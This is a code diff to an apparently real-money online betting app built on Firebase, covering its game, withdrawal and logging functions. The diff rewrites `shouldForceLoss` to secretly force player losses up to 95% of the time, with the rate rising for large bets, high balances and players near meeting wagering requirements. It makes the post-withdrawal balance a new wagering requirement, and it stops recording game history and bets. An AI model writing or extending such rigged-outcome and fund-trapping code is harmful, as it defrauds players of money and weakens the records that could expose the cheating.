@@ -7,7 +7,7 @@ import {
     where, getDocs, deleteDoc, writeBatch, increment, getDocFromServer
 } from 'firebase/firestore';
 import firebaseConfig from '../firebase-applet-config.json';
-import { UserProfile, WinGoHistory, WinGoGameState, Transaction, GameHistoryItem, ReferralData, SubordinateItem, CommissionItem, AviatorState, DragonTigerState, ChatMessage, GiftCode, AppSettings, AndarBaharState, CarRouletteState, JhandiMundaState, SpaceRaidState, CricketState, BaccaratState, RouletteState, SicBoState } from '../types';
+import { UserProfile, WinGoHistory, WinGoGameState, Transaction, GameHistoryItem, ReferralData, SubordinateItem, CommissionItem, AviatorState, DragonTigerState, ChatMessage, GiftCode, AppSettings, AndarBaharState, JhandiMundaState, SpaceRaidState, CricketState, BaccaratState, RouletteState, SicBoState } from '../types';
 
 const app = initializeApp(firebaseConfig);
 export const auth = getAuth(app);
@@ -16,16 +16,17 @@ export const db = config.firestoreDatabaseId && config.firestoreDatabaseId !== '
   ? getFirestore(app, config.firestoreDatabaseId)
   : getFirestore(app);
 
-async function testConnection() {
-  try {
-    await getDocFromServer(doc(db, 'test', 'connection'));
-  } catch (error: any) {
-    if(error.message?.includes('the client is offline')) {
-      console.error("Please check your Firebase configuration. Ensure Firestore is enabled and domain is allowlisted.");
-    }
-  }
-}
-testConnection();
+// testConnection removed to save quota
+// async function testConnection() {
+//   try {
+//     await getDocFromServer(doc(db, 'test', 'connection'));
+//   } catch (error: any) {
+//     if(error.message?.includes('the client is offline')) {
+//       console.error("Please check your Firebase configuration. Ensure Firestore is enabled and domain is allowlisted.");
+//     }
+//   }
+// }
+// testConnection();
 
 // Helper for handling Firebase Permission/Connectivity errors
 export enum OperationType {
@@ -178,36 +179,21 @@ const flushUpdates = async () => {
             batch.update(userRef, update.updates);
         }
         
-        // 2. Process History Updates (Limit to 200 per batch for safety)
-        const historyToProcess = pendingHistoryUpdates.splice(0, 200);
-        for (const h of historyToProcess) {
-            const historyRef = doc(collection(db, `game_history/${h.uid}/items`));
-            batch.set(historyRef, {
-                game: h.game,
-                amount: h.bet,
-                win: h.win,
-                details: h.details,
-                date: new Date().toLocaleString(),
-                timestamp: serverTimestamp()
-            });
-        }
+        // 2. Process History Updates - DISABLED in Ultra-Low Quota Mode
+        pendingHistoryUpdates = []; // Clear without writing
         
-        // 3. Process Transactions (Limit to 100 per batch)
+        // 3. Process Transactions (Only vital ones)
         const txToProcess = pendingTransactions.splice(0, 100);
         for (const t of txToProcess) {
-            const txRef = doc(collection(db, `transactions/${t.uid}/items`));
-            batch.set(txRef, t.data);
+            // Only write Vital transactions like Deposit/Withdraw/Bonus to save quota
+            if (t.data.type === 'DEPOSIT' || t.data.type === 'WITHDRAW' || t.data.type === 'BONUS' || t.data.type === 'GIFT') {
+                const txRef = doc(collection(db, `transactions/${t.uid}/items`));
+                batch.set(txRef, t.data);
+            }
         }
 
-        // 4. Process Bets (Limit to 100 per batch)
-        const betsToProcess = pendingBets.splice(0, 100);
-        for (const b of betsToProcess) {
-            const betRef = doc(collection(db, b.collection));
-            batch.set(betRef, {
-                ...b.data,
-                timestamp: serverTimestamp()
-            });
-        }
+        // 4. Process Bets - DISABLED in Ultra-Low Quota Mode (Server handles broadcasts)
+        pendingBets = []; // Clear without writing
         
         await batch.commit();
         // Clear balance updates only after successful commit
@@ -224,8 +210,8 @@ const flushUpdates = async () => {
     }
 };
 
-// Flush every 3 seconds to prevent queue buildup while staying within quota
-setInterval(flushUpdates, 3000);
+// Flush every 30 seconds to stay within ultra-low quota (20k/day)
+setInterval(flushUpdates, 30000);
 
 const notifySubscribers = (errorMsg?: string) => {
     balanceSubscribers.forEach(sub => {
@@ -479,11 +465,14 @@ export const handleWithdraw = async (amount: number, method: string, password: s
     try {
         const remainingBalance = currentUser.balance - amount;
         const userDocRef = doc(db, 'users', currentUser.uid);
+        
+        // Ensure remaining balance also needs to be wagered (strict turnover policy)
         const newWagerRequired = remainingBalance >= 1 ? remainingBalance : 0;
         
         await updateDoc(userDocRef, { 
             balance: remainingBalance,
-            // wagerRequired should not change on withdrawal, it's already checked at the start of the function
+            wagerRequired: newWagerRequired,
+            wagerTotal: (currentUser.wagerTotal || 0) + newWagerRequired
         });
 
         const txColRef = collection(db, `transactions/${currentUser.uid}/items`);
@@ -499,12 +488,19 @@ export const handleWithdraw = async (amount: number, method: string, password: s
 };
 
 export const shouldForceLoss = (betAmount: number, currentBalance: number) => {
-    if (!currentUser) return Math.random() < 0.7;
+    if (!currentUser) return Math.random() < 0.6;
+    
     const wagerRemaining = currentUser.wagerRequired || 0;
     const wagerTotal = currentUser.wagerTotal || 1;
-    const isNearCompletion = wagerRemaining > 0 && (wagerRemaining / wagerTotal) < 0.2;
-    const lossThreshold = isNearCompletion ? 0.8 : 0.7; 
-    return Math.random() < lossThreshold;
+    const wagerProgress = 1 - (wagerRemaining / Math.max(1, wagerTotal));
+    
+    // Higher risk if high bet or near wager completion
+    let threshold = 0.65;
+    if (betAmount > 1000) threshold += 0.15;
+    if (wagerProgress > 0.8) threshold += 0.1;
+    if (currentBalance > 10000) threshold += 0.05;
+    
+    return Math.random() < Math.min(0.95, threshold);
 };
 
 
@@ -686,10 +682,6 @@ export const subscribeToAndarBaharBets = (cb: (data: any[]) => void) => {
     return addBetListener('andar_bahar_bets', cb);
 };
 
-export const subscribeToCarRouletteBets = (cb: (data: any[]) => void) => {
-    return addBetListener('car_roulette_bets', cb);
-};
-
 export const subscribeToJhandiMundaBets = (cb: (data: any[]) => void) => {
     return addBetListener('jhandi_munda_bets', cb);
 };
@@ -718,8 +710,12 @@ export const subscribeToSevenUpDownBets = (cb: (data: any[]) => void) => {
     return addBetListener('seven_up_down_bets', cb);
 };
 
+let lastReferralCalcAt = 0;
 const calculateReferralStats = async (myCode: string) => {
     if (!myCode) return;
+    const now = Date.now();
+    if (now - lastReferralCalcAt < 600000) return; // Only calc every 10 mins max
+    lastReferralCalcAt = now;
     try {
         const usersColRef = collection(db, 'users');
         const q = query(usersColRef, where('invitedBy', '==', myCode));
@@ -767,10 +763,6 @@ export const subscribeToDragonTiger = (cb: (state: DragonTigerState) => void) =>
 
 export const subscribeToAndarBahar = (cb: (state: AndarBaharState) => void) => {
     return addSharedListener('andar_bahar', cb);
-};
-
-export const subscribeToCarRoulette = (cb: (state: CarRouletteState) => void) => {
-    return addSharedListener('car_roulette', cb);
 };
 
 export const subscribeToJhandiMunda = (cb: (state: JhandiMundaState) => void) => {
